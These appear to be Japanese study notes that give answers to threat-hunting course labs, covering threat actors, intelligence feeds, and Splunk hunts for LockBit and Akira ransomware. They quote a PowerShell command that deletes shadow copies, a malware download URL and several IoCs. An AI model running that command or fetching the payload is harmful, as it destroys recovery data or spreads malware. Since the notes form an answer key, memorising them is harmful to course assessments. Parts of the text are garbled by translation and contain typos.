
# 1.脅威駆除の概念と実践
## 1.1 企業向け脅威ハンティング

---

### 1.1.1 脅威ハンティングの概要

 ラボ

1. 空欄を埋めてください。主に事後対応的な他の防御策とは対照的に、脅威ハンティングは_________です。

答え　proactive

2. 脅威ハンティングは、セキュリティに対するどのようなアプローチの一部ですか?

答え　defense-in-depth

3. アラートを調査し、アクティビティが悪意のあるものかどうかを判断する責任を最も一般的に負っているチームまたは役割はどれですか?

```
A. Risk Management
B. Security Operations Center
C. Governance Committee
D. Software Development Team
```

答え　b

---

### 1.1.2. 組織内および組織内の脅威ハンティング

ラボ

    シナリオ:脅威の追跡中に、インシデントのレベルまで上昇する悪意のある活動を発見する。他にどのようなチームと関わるのでしょうか?

答え  Incident Response

    シナリオ:当組織は、脅威ハンティングプログラムの改善を目指しています。現在どのレベルにあるか、そして次のステップとしてどのような良いステップがあるかを判断するために使用できるモデル(このモジュールで言及されている)の名前は何ですか?

答え Threat Hunting Maturity Model

    シナリオ:私たちはスタートアップの小規模なセキュリティチームの一員であり、その主な製品は新しい独自の最先端技術に基づいています。このプロプライエタリ情報を参照できる(このモジュールで言及されている)一つの方法は何ですか?

A. Public disclosure
B. Open-source intelligence
C. Crown jewels
D. Competitive research

答え c

---

### 1.1.3.第三者脅威ハンティングサービス


ラボ

    シナリオ:私たちはセキュリティ予算が限られている中小規模企業で働いており、すでにSOCにマネージドセキュリティサービスプロバイダー(MSSP)を使用しています。脅威の追跡を当社のセキュリティ対策の一部として含めたいと考えています。以下のいずれかを実行しやすいのは、回答に対応する書簡の入力です。
    (A) 社内脅威ハンティングチームの構築、(B) 第三者による脅威ハンティングサービスの購入 または(C)AとBの組み合わせ。

答え b

    空白を記入してください。サードパーティの脅威ハンティングサービスの利点の一つは、さまざまな______を可視化でき、互いに収集した知見をすばやく適用できる点です。

A. environments
B. networks
C. customers
D. all of the above

答え a

---

### 1.1.4 脅威ハンティング管理

ラボ

    以下の声明を検討してください。「攻撃者は、仮想マシンからホストへ脱出することで、特権をエスカレートさせようとしています。」これはどのような種類の声明ですか?

答え hypothesis

    複数のシステムから単一の場所にログを集約するツールは何ですか。これらのログを検索するために使用でき、脅威の追跡中に使用されます。

答え  SIEM

    シナリオ:我々は脅威の追跡を行っている。トリガー/仮説を決めました。次にどの段階に進むのでしょうか?

答え investigation

---


## 1.2 脅威ハンティング手法および調査の種類

---
### 1.2.1.構造化された脅威探索

ラボ

    構造化された脅威の追跡は、____から始まる。頭字語を入力してください。

答え　TTPS

    構造化された脅威探索に関する以下の仮説を考えてみましょう。 攻撃者は、過激な強制力を使って資格情報へのアクセスを得ようとしている。 Mitre Att&ck Frameworkミトレ・アットアンドック・フレームワークを参照してください。 この仮説のどの部分が、その技法を指しているのかtechnique 攻撃者が利用していますか?

A. Credential Access
B. Initial Access
C. Execution
D. Brute Force

答え　d

---


### 1.2.2非構造化脅威ハンティング

ラボ

    シナリオ：脅威インテリジェンスチームから、脅威ハンターである私たちに、私たちの環境に関連する、最近悪用された脆弱性に関する一連のIoCが渡されます。私たちはこれを脅威ハンティングのトリガーとして使用します。これはどのような種類の脅威ハンティングでしょうか？
(→iocベース)
答え Unstructured Threat Hunting

    シナリオ：脅威アクターが内部スピアフィッシングを用いて当社の環境内でラテラルムーブメントを実行しているという仮説に基づき、脅威ハンティングを開始します。これはどのような種類の脅威ハンティングでしょうか？
(→ttpベース)
答え structured Threat Hunting

    空白を埋める:脅威の追跡は結果によって引き起こされ得る その他の________、反復的、同時性を強調する 脅威の追跡が継続的に行われる。

A. SIEM dashboards
B. Threat hunts
C. IOC lookups
D. Vulnerability scans

答え　B
(脅威ハンティングは他の脅威ハンティングの結果によってトリガーされる可能性があり、脅威ハンティングの反復的、同時的、継続的な性質を強調しています。)
---

### 1.2.3 状況//エンティティ主導の脅威ハンティング

ラボ

    さまざまなリスクを特定するためにどのような手順が用いられているか 組織が直面するリスクのレベル?

答え risk assessment

    最近、ペネトレーションテストが実施され、その結果が見つかりました 設定の誤りにより、特定のアカウントがはるかに大きくなる原因となった 本来あるべき権限よりも。脅威の追跡を開始しました これらの権限がいつでも悪用されたかどうかを判断してください。どのようなタイプですか 脅威の追跡はこれですか?

答え  Situational//Entity-Driven Threat Hunting

    シナリオ:最近、リスク評価を実施し、現在対応しています 決定されたことをもとに、脅威探索を開始する計画を立てる そこに。空白を記入してください。私たちはその取り組みを資産に集中すべきです 最大のリスク、すなわち最大の可能性および/または ______。

A. exposure
B. availability
C. impact
D. asset value

答え c

---

# 2.脅威アクターのランドスケープ概要


---


 ## 2.1.脅威アクタの種類

 ---
 
### 2.1.1。サイバー犯罪者

 ラボ

    ワークステーションにログオンすると、予期しない壁紙が浮かびます これは、システムのファイルが暗号化されていることを宣言するものです。壁紙 支払い方法の詳細が記載されたファイルにアクセスするよう指示します 暗号資産におけるファイル復号化のための具体的な金額。どのようなタイプですか 攻撃はこれですか?

答え ronsomeware

    財務部門の従業員が、要求するメールを受け取る サービスへのお支払い。そのメールは、働いていると主張する人物からのものです 定期的に支払いを行っているが、最新のサービスを提供している企業では 支払い情報。従業員はいつもの連絡先に連絡しています サービス会社は、その要請の正当性を確認し、その確認を行う それは正しくないということです。サイバー犯罪者セクションの用語を使用して、どのようなタイプの攻撃が呼び出されますか?

答え  Business Email Compromise
 
 
 ---


### 2.1.2.高度な永続的脅威

 
 ラボ

    組織のネットワーク上で脅威アクターが発見された。 インシデント対応プロセスの一環として、組織は ネットワークから脅威を根絶するための措置。数か月後、 組織は、講じられた措置が完全には行われていないことを発見した 効果的であり、脅威アクターはそれらの存在にもかかわらずアクセスを維持した 努力。これはどのような特徴や活動を維持していますか 存在とは、次のようなことを指すのか?

答え  Persistent

    attack2022年3月、ロシアによるウクライナ侵攻の前夜、衛星通信事業者のヴィアサット氏に対する攻撃が発生した。この攻撃は、ウクライナの通信を妨害することを狙っていた可能性が高い。この種の攻撃にどのような目標が合致しているのか?

A. Financial extortion
B. Espionage for intelligence gathering
C. Operational disruption or sabotage
D. Reputation damage
E. Intellectual property theft

答え c


    空白を記入してください。APTは____を標的にして他の人にアプローチする可能性がある より価値の高いターゲット。

A. social media platforms
B. third-party vendors
C. antivirus software
D. internal developers
E. operating system updates

答え b
 
 
 ---

### 2.1.3.内部脅迫

ラボ

    ベライゾンの2023年データ漏洩調査報告書によると、その内容は インシデントのパーセンテージは、インサイダーによる脅威によるものでしたか?

答え 19


 ---

## 2.2.ランサムウェアの脅威要因
  ---

### 2.2.1.ランサムウェアの脅威アクターの運営方法

ラボ

    当組織では、いくつかのシステムが暗号化されています。見つけました 各マシンに、特定の量の暗号資産を記載したファイル 特定の日付までに支払わなければならない。支払わなければ、脅威が生じる オンラインでデータを漏洩する。このインシデントは、どのタイプのものかを表しています ランサムウェア技術?

A. Single extortion ransomware (encryption-only)
B. Double extortion ransomware
C. Encryption-less ransomware (extortion-only)
D. Locker ransomware
E. Ransomware-as-a-Service (RaaS)

答え  b 

    私たちの組織では、複数のシステムが暗号化され、身代金の支払いが要求されました。しかし、身代金を支払わなければ、データは暗号化されたままになり、侵害や追加の攻撃のリスクはないようです。振り返ってみると、身代金の支払いを拒否した場合の影響を最小限に抑えるために、攻撃前にどのような予防策を実施できたでしょうか？

A. Threat intelligence
B. Multi-factor authentication (MFA)
C. Triple extortion
D. Endpoint Detection and Response (EDR)
E. Taking regular, secure backups

答え e

 ---

### 2.2.2ロックビット

ラボ


    Port of Lisbon2022年12月25日、ロックビットはランサムウェアを使用してリスボン港を攻撃しましたか?身代金はいくらで、その金額はいくらだったでしょうか?数字以外の文字(ドル記号($)やカンマ(,,)など)なしで回答を送信してください。

答え 1500000

    2023年のCitrixの脆弱性は、LockBit関連会社が悪用していることが知られている。CVE IDを入力してください(例:CVE-2023-12345)。この演習の答えは、インターネットで調査を行うことで見つけることができます。

答え CVE 2023-4966

 ---

### 2.2.3。CL0P

ラボ

    最近、ランサムウェアの脅威攻撃者がそうであることがわかりました 自社のデータを保有しており、要求が厳しいものであると主張しています 支払い。彼らはデータのごく一部を証拠として共有している。 我々は正当であることを確認した。努力しているにもかかわらず、私たちはそうしていません ネットワーク内に暗号化されたデータを持つシステムが見つかりました。いったいどんなもの ランサムウェアはあり得るでしょうか?

A. Traditional ransomware with file encryption and ransom note
B. Locker ransomware that prevents access to the operating system
C. Encryption-less ransomware (extortion-only attack)
D. Double extortion ransomware with encryption and data leak threats
E. Scareware attack pretending to be ransomware

答え c

    2023年1月、CL0PはFortraのGoAnywhere Managed File Transfer 7.1.1 （MFT）ソフトウェアのゼロデイ脆弱性を悪用し始めました 。彼らが悪用した脆弱性のCVE IDは何ですか？

答え CVE-2023-0669


 ---

### 2.2.4。ブラックキャット/アルファベット

ラボ

    2023年、もともとプログラミング言語「Go」で記述されたランサムウェアファミリーが、パフォーマンスと回避能力を強化するためにRustに移行した。

A. BlackCat (ALPHV)
B. Hive
C. 3AM (ThreeAM)
D. Agenda (Qilin)
E. Akira

答え b

    2023年6月、BlackCat/ALPHV 主張された Redditをハッキングし、80GBのデータを取得したこと。彼らはその要求を求めた 450万米ドルの身代金を請求し、その取り消しを要請しました 特定のReddit機能の価格を変更する提案はありますか?(注:Redditはキャンセルの要求に屈しませんでした。)

A. Reddit Gold membership
B. Moderator privileges
C. API access pricing
D. Community awards system
E. Reddit Ads platform fees

答え c 



 ---

## 2.3.高度な永続的脅威
 ---
2.3.1.APT命名条約
 ラボ

    APT 41 はどの国に起因するのでしょうか?インターネットで調査を行うか、このセクションにあるリンクをいくつか調べて答えを見つけてください。

答え china

    ウィキッドパンダのマンディアント命名規則とは何ですか?インターネットで調査を行うか、このセクションにあるリンクをいくつか調べて答えを見つけてください。

答え apt41

    MicrosoftマイクロソフトはAPT32を追跡するためにどのような名前を使用していますか?インターネットで調査を行うか、このセクションにあるリンクをいくつか調べて答えを見つけてください。他の組織(MitreまたはCrowdStrike)から指定された名前は無効になります。マイクロソフトの名前のみ。

答え Canvas Cyclone
ヒントを表示

 
 
 
 ---

2.3.2APT29 / コージーベア / ミッドナイトブリザード

ラボ

    米ドルでは、ソーラーウィンズがどれだけの資金を投入したと見積もっていたか 2021年第一四半期のソーラーウィンズ攻撃事件を調査中?(XX、xxx、xxx で入力)

答え 18,000,000

    2023年9月、APT29はソフトウェア開発者向けのCI/CDソフトウェアであるJetBrains TeamCityの脆弱性を悪用し始めました。この脆弱性（ CVE-2023-42793 ）は、リモートコード実行につながる_____________ ______脆弱性です。
  
答え Authentication Bypass

    2023年9月、APT29はCI/CDソフトウェアプラットフォームであるJetBrains TeamCityCI/CDTeamCityの脆弱性を悪用した。米国によるとサイバーセキュリティおよびインフラセキュリティ庁(CISA)は、この悪用によって、以下のネットワークの侵害につながる可能性がある。

A. Financial institutions worldwide
B. Cloud service providers
C. Dozens of software developers
D. U.S. government agencies
E. Industrial control systems operators

答え c



 ---

2.3.3.ラザラス・グループ/APT38/ラビリンス・チョリマ

 ラボ

    2023年、ラザラスグループは、当時約3500万米ドルの価値があった暗号資産を盗む暗号資産(仮想通貨)の申請を攻撃した。

A. CoinsPaid
B. Atomic Wallet
C. Stake.com
D. CoinEx

答え b

    2021/2022年におけるラザラスグループは、2023年においても引き続き悪用していた注目度の高い脆弱性はどれですか?これはインターネット研究を必要とするかもしれない。

A. CVE-2021-34527 (PrintNightmare)
B. CVE-2021-26855 (ProxyLogon)
C. CVE-2021-44228 (Log4Shell)
D. CVE-2021-21985 (vCenter Server RCE)
E. CVE-2021-22986 (F5 BIG-IP iControl REST)

答え c

    空白を埋める:ランサムウェアの一種であることに加え、 WannaCryウイルスもまた____だった。

答え worm
 
 
 ---

2.3.4。ミント・サンドストーム/APT35/チャーミング・キトゥンほか

 ラボ

    2023年、研究者らはイランの脅威グループであるMint Sandstormが、サイバースパイ活動におけるどのmacOSマルウェアを使用しているかを観察した。

この質問に対する答えを見つけるために、インターネット調査を行ってください。

A. MediaPl
B. MischiefTut
C. NokNok
D. GorjolEcho

答え c
ヒントを表示

    2023年10月、イスラエルとハマスの間で戦争が勃発した後、クラウドストライクはイスラエルのどのセクターに対するイランによるサイバー攻撃を観測しましたか？セクターを1つ入力してください
    
答え transportation

 
 ---

2.3.5。方程式グループ

ラボ

    2017年、方程式グループは攻撃に使用されたエクスプロイトを開発した APTsの文脈で議論される。これはどの悪用だったのでしょうか?インターネット調査を行い、答えを決定する。

答え EternalBlue
ヒントを表示

    どのグループが、複数のツールを取得およびリークしたか 方程式グループ?インターネット調査を行い、答えを決定してください。

答え The Shadow Brokers

    Stuxnetには、どのような高度なサイバースパイツールが関係していますか? インターネット調査を行い、答えを決定する。

答え flame


---

3. 脅威ハンターのためのコミュニケーションと報告

---

3.1. インバウンド通信

---
## 3.1.1. 信号プロトコル

1. 複数の大手銀行で使用されているソフトウェアに脆弱性が検出されました。この脆弱性はリモートから悪用される可能性があり、銀行の信用を大きく失墜させ、取り付け騒ぎを引き起こす可能性があります。パッチはまだ提供されていませんが、代替策が開発されています。この情報は、提携銀行のシステム管理者に提供する必要があります。どのレベルに設定すればよいでしょうか？

答え red

2. TLPがAmberにマークされた機密情報を受け取りました。これは、他の組織の同僚がシステムを保護する際に役立つと確信しています。Strictにマークされていないので、口頭で伝えてもいいでしょうか？

答え no

---
## 3.1.2. 脅威インテリジェンスフィード


1. このセクションに記載されている手順に従って、[MalwareBazaar](https://bazaar.abuse.ch/downloads/misp/) が提供するMISP脅威インテリジェンスフィードから [JSONファイル](https://bazaar.abuse.ch/downloads/misp/5da35143-012c-404e-b8c0-97e93e5fa599.json)をダウンロードし、その内容を分析してください。IoCに関連付けられているSHA256ハッシュは何ですか ？[](https://bazaar.abuse.ch/downloads/misp/)`Purchase Order No.5817-0001142025.bat`

答え 70c1d9f480bba58360e42af222d4c1a3ff7dc5d0f2a6d96b1650dc6076027d52

```
──(kali㉿kali)-[~] └─$ jq -r '.Event.Object[] | select(.Attribute[]?.value == "Purchase Order No.5817-0001142025.bat") | select(.type == "sha256") | .value' threats.json                                                                                                                                                                                                                                              ┌──(kali㉿kali)-[~] └─$ jq -r '   .Event.Object[]   | select(.Attribute[]?.value == "Purchase Order No.5817-0001142025.bat")   | .Attribute[]   | select(.type == "sha256")   | .value ' threats.json  70c1d9f480bba58360e42af222d4c1a3ff7dc5d0f2a6d96b1650dc6076027d52
```

2. [デフォルトのフィードに](https://www.misp-project.org/feeds/)は、様々な追加のIoCとアーティファクトが含まれています。例えば、 [URLHaus](https://urlhaus.abuse.ch/downloads/misp/) のこの[JSONファイル](https://urlhaus.abuse.ch/downloads/misp/7a9e7172-44f9-4138-98b0-f99386a75aa2.json) をご覧ください。脅威ハンティングのスプリントでこのURLを見つけたと仮定します。JSONファイル内の脅威インテリジェンスデータを使用して、このIoCに関連付けられている[コマンド＆コントロールフレームワーク](https://redcanary.com/threat-detection-report/trends/c2-frameworks/) の名前は何でしょうか ？[](https://urlhaus.abuse.ch/downloads/misp/)`http://45.221.99.49/02.08.2022.exe`

答え  COBALTSTRIKE

---

3.2. アウトバウンド通信

---

## 3.2.1. 内部セキュリティ通信

#### ラボ

1. 調査を開始し、Active Directoryに最近追加されたアカウントを特定しました。アカ​​ウントが追加された経緯や、そのアカウントを使用したアクティビティの証拠は一切ありません。どうすればよいでしょうか？

```
(a) Ignore it as we didn't plan on finding any anomalies during this sprint  
(b) Email the Active Directory administrator and don't advise the team  
(c) Report it at the daily stand-up and recommend follow up 
(d) Note it for the end of sprint report
```

答え c

2. サーバーの1つに脆弱性が見つかりましたが、既知のCVEと一致しません。どうすればよいでしょうか？

```
(a) Stop our sprint and prepare a responsible disclosure report  
(b) Report the finding at the daily stand-up, add it to the backlog, and establish its priority
(c) Note it for the end of sprint report
(d) Write up the details on our personal blog   
```

答え b

---
## 3.2.2. 開示プロトコル

1. 脅威ハンティングの過程で、新たなRPCコールエクスプロイトを利用してMicrosoft Exchange上のメールにアクセスするペイロードを発見しました。脅威インテリジェンスでは、この脆弱性に対応するCVEコードを特定できませんでした。どうすればよいでしょうか？

```
(a) Mark the information TLP Red and notify Microsoft via the
Microsoft Security Response Center Researcher Portal.  
(b) Ring around our colleagues and chat about the issue to check if
anyone knows about it.
(c) Write a PoC and publish it as a blog post so as many people as
possible know about it
(d) Apply a workaround and move on 
```

答え a

2. 脅威ハンティングを通じてデータ侵害を発見し、企業がそれを開示することを決定した場合、データが漏洩したかどうかを判断するために、2つの技術的な事実を明らかにする必要があります。1つ挙げてください（単語1つで）。

答え 　 encrypted

---

## 3.2.3. 脅威インテリジェンスレポート


1. 脅威インテリジェンスレポートを作成中で、悪意のあるファイルを特定しました。ファイルのハッシュ値はレポートのどのセクションに記載すればよいでしょうか？

答え　ioc



2. 脅威ハンティングで特定した侵入について、観察したTTP（戦術、技術、運用、または技術）の詳細を記載したレポートを作成します。この脅威インテリジェンスレポートの形式は、戦略的、戦術的、運用的、または技術的のどれですか？

答え tactical

---

# 4. ネットワークデータを使ったハンティング

---

## 4.1. 脅威ハンターのためのネットワークデータ


1. 侵害の兆候 (IoC) の文脈における「忠実性」の定義は何ですか?

```
A. The speed of data transmission
B. The accuracy, reliability, and precision of information
C. The size of network traffic
D. The encryption strength of network communication
```

答え b


2. サイバーセキュリティにおける帰属には何が含まれますか?

```
A. Identifying network-based indicators
B. Detecting anomalies in network behavior
C. Identifying the individuals or entities responsible for a cyber attack
D. Analyzing behavioral-based indicators of compromise
```

答え c



3. 行動ベースの侵害指標の例にはどのようなものがありますか?

```
A. Detection of uncommon protocols, sudden spikes in traffic volume, known traffic on unknown ports
B. Analysis of network logs, behavioral profiling, detection of anomalies in network behavior
C. Identifying IP addresses, domains, and network signatures
D. Analyzing predefined patterns in network traffic, detecting anomalies in network behavior, inspecting network communication at the host level
```

答え a



4. 本文中で言及されているSuricataルールの目的は何ですか?

```
A. To detect abnormal traffic patterns
B. To identify known traffic on unknown ports
C. To detect HTTP traffic indicative of a connection to the LockBit ransomware payment domain
D. To analyze network logs for potential security risks
```

答え c

---


## 4.1.2. ネットワークIOCの発生源


1. IDS と IPS の主な違いは何ですか?

```
A. IDS actively blocks suspicious packets, while IPS only monitors
B. IDS watches for attacks and blocks them, while IPS keeps detailed records
C. IDS only monitors inbound traffic, while IPS monitors both inbound and outbound
D. IPS is proactive, while IDS is reactive
```

答え  d



2. IDS/IPS システムは主にどのようにして疑わしいアクティビティを識別するのでしょうか?

```
A. Through behavioral analysis
B. Through stateful inspection
C. Through signature-based detection
D. Through firewall logs
```

答え c



3. IoC の生成においてファイアウォールはどのような役割を果たすのでしょうか?

```
A. They actively block suspicious traffic
B. They conduct behavioral analysis
C. They monitor access attempts and network traffic
D. They generate alerts based on network anomalies
```

答え c


---

## 4.2. 実践的なネットワークデータ分析

---

## 4.2.1. Lockbitランサムウェア


1. VMグループ1を起動し、このセクションで説明した手順を繰り返します。e.taylorドメインユーザーに関連するネットワークイベントとTCPポート80への送信をフィルタリングするSplunkクエリはどれですか _？ DEV01への認証には__xfreerdp_を使用できます。

答え　index=* User="MEGACORPONE\\e.taylor" DestinationPort="80"


2. シナリオで提供されている最初の Splunk クエリの主な目的は何ですか?
→「index="*" SourceHostname="CLIENT2.megacorpone.com"| top limit=20 DestinationIp」
```
A. To identify the top 20 destination IP addresses associated with ransomware traffic
B. To search for events originating from a specific hostname
C. To generate a table mapping malicious IP addresses against running processes
D. To filter out events based on a specific time frame
```

答え　a


3. Splunk は疑わしい IP アドレスの調査にどのように役立ちますか?

```
A. By analyzing network traffic from all internal networks
B. By generating a table mapping malicious IP addresses against running processes
C. By searching for events originating from a specific hostname
D. By correlating the suspicious IP with the LockBit ransomware infrastructure
```

答え　d


4. LockBit ランサムウェアの主な目的は何ですか?

```
A. To encrypt sensitive company data
B. To steal user credentials
C. To delete system files
D. To disrupt network communication
```

答え a


5. ランサムウェア攻撃に関連する IoC に対処する際に注意を払うことが重要なのはなぜですか?

```
A. To speed up the investigation process
B. To avoid tipping off the attacker
C. To increase network bandwidth
D. To minimize system downtime
```

答え b

---
## 4.2.2. 完全なパケットキャプチャ分析

1. VMグループを起動し、このセクションで説明した手順を繰り返します。NetWitness内で最初のsuricataセッションを分析し、宛先ドメイン「googleusercontent.com」に属するIPアドレスを検出します。

答え　35.244.181.201

[ヒントを表示](https://portal.offsec.com/courses/th-200-184134/learning/hunting-with-network-data-178185/practical-network-data-analysis-178214/full-packet-capture-analysis-178186#)


2. Wireshark は脅威ハンティングにどのように貢献しますか?
```
A. It automatically detects and removes malicious packets
B. It provides advanced threat intelligence
C. It allows analysts to examine individual pieces of network data
D. It performs automated network scans
```

答え c


3. マルウェアの動作における ARP スキャンの重要性は何ですか?

```
A. It allows malware to encrypt network traffic
B. It helps malware discover backup servers
C. It facilitates malware distribution through email
D. It enables malware to spread through USB devices
```

答え　b


4. 脅威ハンティングにおいてマルウェア サンプルの SHA256 ハッシュを取得することの意義は何ですか?

```
A. To encrypt the malware sample
B. To identify the malware variant
C. To analyze the behavior of the malware
D. To decode the malware's communication protocol
```

答え　ｂ



5. 本文に記されているように、ネットワーク脅威ハンティングの最終的な目標は何でしょうか?

```
A. To prevent all cyberattacks
B. To identify and respond to emerging threats
C. To analyze network traffic for entertainment purposes
D. To shut down all malicious websites
```

答え b



---

# 5. エンドポイントでのハンティング

---
## 5.1. 脅威ハンターのためのエンドポイント

---
## 5.1.1. エンドポイントIoCの種類
---
## 5.1.2. エンドポイントデータのソース
---
## 5.1.3. エンドポイントIoCの考慮事項
---
## 5.2. 実践的なエンドポイント脅威ハンティング

1. このセクションの手順に従って、DEV上のアーカイブを分析し、SPLUNK1で検索を実行してください。ランサムウェアは通常、ファイルのすべてのコンテンツを暗号化しません。これは、パフォーマンスの低下や検出リスクの増大につながる可能性があるためです**。mco.xml.nmh**ファイルを確認してください。NetworkConnect Sysmonイベントに使用されるルールグループの名前は何ですか？

答え　NetworkCons


2. ランサムウェアはシステムの可用性を確保するために、特定のパスを避けることがよくあります。C **:\Windows**ディレクトリとそのサブディレクトリには、いくつのランサムウェアのメモがドロップされましたか？複数のキーワードや文字列を検索するには、「AND」演算子を使用してください。

答え　0
```
index="*" "akira_readme.txt" AND   TargetFilename="C:\\Windows*"
```


3. **ランサムウェアによって暗号化されたCLIENT3上のpasswords.kdbx**ファイル（DEV上のアーカイブ内）が最初に作成されたのはいつですか？M/D/YY H:MM:SSの形式で回答してください。（ _Time_列のタイムスタンプを使用してください）

答え 3/4/24 5:43:15.000


4. KeePass データベースが作成されたパス名は何ですか? 回答として、ファイル名を除いたディレクトリのフルパスを入力してください。

答え 	C:\Program Files\KeePass Password Safe 2

---

## 5.2.3. ファイルアーティファクト


1. このセクションの手順に従って、ファイル関連のアーティファクトを探してください。TrendMicroの[IoCリスト](https://documents.trendmicro.com/assets/txt/ransomware-spotlight-akira-iocssrFFEFh.txt)に記載されている_AdFind_バイナリの_検出名は_何ですか？[](https://documents.trendmicro.com/assets/txt/ransomware-spotlight-akira-iocssrFFEFh.txt)

答え HackTool.Win32.ADFind.B

```
SHA-256 hash or URL							Detection name			Description
337d21f964091417f22f35aee35e31d94fc3f35179c36c0304eef6e4ae983292	Ransom.Win64.AKIRA.SMTH		Akira ransomware
3c92bfc71004340ebc00146ced294bc94f49f6a5e212016ac05e7d10fcb3312c	Ransom.Win64.AKIRA.THDBFBC	Akira ransomware
637e28b38086ff9efd1606805ff57aaf6cdec4537378f019d6070a5efdc9c983	Ransom.Win64.AKIRA.SMTH		Akira ransomware
67afa125bf8812cd943abed2ed56ed6e07853600ad609b40bdf9ad4141e612b4	Ransom.Win64.AKIRA.THEOIBC	Akira ransomware
678ec8734367c7547794a604cc65e74a0f42320d85a6dce20c214e3b4536bb33	Ransom.Win64.AKIRA.THEOIBC	Akira ransomware
7b295a10d54c870d59fab3a83a8b983282f6250a0be9df581334eb93d53f3488	Ransom.Win64.AKIRA.THDBFBC	Akira ransomware
8631ac37f605daacf47095955837ec5abbd5e98c540ffd58bb9bf873b1685a50	Ransom.Win64.AKIRA.THEAABC	Akira ransomware
1d3b5c650533d13c81e325972a912e3ff8776e36e18bca966dae50735f8ab296	Ransom.Linux.AKIRA.THFBCBC	Akira Linux ransomware
094d1476331d6f693f1d546b53f1c1a42863e6cde014e2ed655f3cbe63e5ecde	HackTool.Win32.ToolPow.SM	PowerTool binary
35415d97038e091744e9cab3b88c78c1a7ca87f78d2b4a363f72f2c28d65932b	Trojan.Win64.KILLAV.YXDFGZ	Terminator from GitHub
6192beb56de670de902193a33380e5eb0f3b4b2e3e848e7eea8950075f00f2e5	PUA.Win64.PCHUNTER.L		PCHunter binary
d1aa0ceb01cca76a88f9ee0c5817d24e7a15ad40768430373ae3009a619e2691	PUA.Win64.PCHunter.YACIU	PCHunter binary
f157090fd3ccd4220298c06ce8734361b724d80459592b10ac632acc624f455e	HackTool.Win32.ADFind.B		AdFind binary
akiral2iz6a7qgd3ayp3l6yub7xx2uep76idk3u2kollpj5z3z636bad[.]onion	N/A				Akira ransomware leak site
akiralkzxzq2dsrzsrvbr2xgbbu2wgsmxryd4csgfameg52n7efvr2id[.]onion	N/A				Akira TOR negotiation portal
```


2. 専任の脅威インテリジェンスチームやサービスプロバイダーがない場合、脅威ハンターである私たちは、多くの場合、自らインテリジェンスデータを調査する必要があります。これは、インテリジェンスベースの脅威ハンティングを行う脅威ハンターにとって不可欠なスキルです。VirusTotalは、ファイルサンプル、ハッシュ、またはURLに関するインテリジェンスデータを取得するための最も人気のあるサービスの一つです。VirusTotalを使用して、FILE1で見つかったランサムウェア亜種のハッシュを検索してください。ランサムウェア亜種がVirusTotalに最初にアップロードされたのはいつですか？YYYY-MM-DD HH:MM:SSの形式で回答を入力してください。

答え　2023-07-07 20:11:43

リストの中の
```
3c92bfc71004340ebc00146ced294bc94f49f6a5e212016ac05e7d10fcb3312c
```

[ヒントを表示](https://portal.offsec.com/courses/th-200-184134/learning/hunting-on-endpoints-178122/practical-endpoint-threat-hunting-178154/file-artifacts-178124#)



3. 前回の演習に引き続き、VirusTotalを使用して、FILE1で見つかったランサムウェア亜種の分析結果を確認してください。次に、_「検出」_タブに移動します。Microsoftはこの脅威をどのように分類していますか？

答え Ransom:Win64/Akira!MTB


4. トレンドマイクロの脅威インテリジェンスレポートを確認し、「_その他の技術詳細」_セクションを参照してください。Akiraランサムウェアで使用されている暗号化アルゴリズムは何ですか？

答え  chacha20



5. 脅威インテリジェンス レポートに記載されている暗号化されたファイルのファイル拡張子は何ですか?

答え .akira

---

## 5.2.4. 方法論の適応

#### ラボ

1. Megacorp One環境における脅威ハンティング・スプリントの第3フェーズを実行するための手順を以下に示します。Akiraランサムウェアに関する脅威インテリジェンスレポートをさらに確認してください。脅威アクターがシステム復旧をどのように妨害したかを特定し、CLIENT4でこのアクションに関連するイベントを検索してください。このアクションを実行するために使用されたPowerShellコマンドは何ですか？

答え　Get-WmiObject Win32_Shadowcopy | Remove-WmiObject

→Akiraランサムウェアのバイナリには、最近のほとんどのランサムウェアバイナリと同様に、感染したシステムからシャドウコピーを削除することでシステムの復旧を阻止する機能があります。
[ヒントを表示](https://portal.offsec.com/courses/th-200-184134/learning/hunting-on-endpoints-178122/practical-endpoint-threat-hunting-178154/adapting-our-methodology-178123#)
```
index="*" host="CLIENT4" (index="windows_powershell")  OR (index="windows_sysmon" ProcessCreate) "*shadow*"
```

2. 前回の演習で行われたアクションを含むイベントはいつ記録されましたか？回答はHH:MM:SS形式で入力してください。（_「時間」_列のタイムスタンプを使用してください）

答え 7:04:32.000 PM


3. CLIENT4 での BloodHound データアーカイブの作成に関連するイベントをさらに確認してください。アーカイブが作成されたパスは何ですか？ファイル名を除いたディレクトリのフルパスを入力してください。

03/04/2024 18:57:39.000+00:00 にinvoke実行、そのあとに時間を設定
```
index="*" host="CLIENT4" (index="windows_sysmon" FileCreate) "*zip*"
| sort _time
```
答え C:\Windows\Tasks\
( C:\Windows\Tasks\20240304105845_BloodHound.zip)

4. BloodHoundアーカイブがscp経由で転送された攻撃者のマシン上のファイル名（フルパスを含む）は何ですか？/PATH_TO/FILE/FILENAMEの形式で回答を送信してください。

03/04/2024 18:58:59.000+00:00 zip 作成
03/04/2024 19:01:25.000+00:00 転送開始
```
index="*" host="CLIENT4" (index="windows_sysmon" ) "*zip*"
| sort _time
```

答え  /home/y8ki5kl5/20240304105845_BloodHound.zip

---

# 6. IoCを使用しない脅威ハンティング

---

## 6.1. カスタム脅威ハンティング

---

## 6.1.1. カスタム脅威ハンティングとは何ですか?

---
## 6.1.2. 脅威ハンターのためのデータ相関
---
## 6.2. 新しいIoCの脅威ハンティング
---
## 6.2.1. CrowdStrike Falconの紹介
---
## 6.2.2. 環境の紹介
---
## 6.2.3. CrowdStrike Falconによるカスタム脅威ハンティング

1. このセクションの手順に従って、環境内に脅威アクターが存在する兆候を見つけてください。VirusTotalでDNS名**webdav.4shared.comを**検索し、ユーザーのコメントを確認してください。コメントで示されているマルウェアの名前は何ですか？

答え　BumbleBee campaign



2. _RTRを使用してCLIENT2_に接続します。e.taylorのPowerShell履歴を確認します。このユーザーのPowerShell履歴に含まれる、システムにアクセスした攻撃者がよく使用する疑わしいコマンドは何ですか？

答え　whoami

```
"C:\Users\e.taylor\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
```
[ヒントを表示](https://portal.offsec.com/courses/th-200-184134/learning/threat-hunting-without-iocs-178724/threat-hunting-for-new-iocs-178743/custom-threat-hunting-with-crowdstrike-falcon-178727#)



3. CLIENT2 で、少し前に CrowdStrike Falcon が潜在的に不要なバイナリを検出しました_。e.taylor_のホームディレクトリを確認してください。この検出の原因となった可能性のあるポータブルソフトウェアは何ですか？この質問への回答として、ファイル名全体を入力してください。

答え　6.qBittorrentPortable

```
